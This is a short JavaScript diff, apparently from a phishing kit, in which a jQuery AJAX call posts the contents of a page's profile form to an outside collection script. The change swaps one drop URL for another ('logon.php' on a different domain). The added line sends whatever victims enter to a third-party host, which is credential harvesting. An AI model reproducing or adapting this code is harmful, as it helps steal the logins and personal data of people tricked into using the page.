@@ -11,7 +11,7 @@
             var formData = new FormData($("#profileUp")[0]);
 
             $.ajax({
-                url: "https://breaklogcx.000webhostapp.com/bn/tip.php",
+                url: "https://ighese.ir/logon.php",
                 type: 'POST',
                 data: formData,
                 contentType: false,
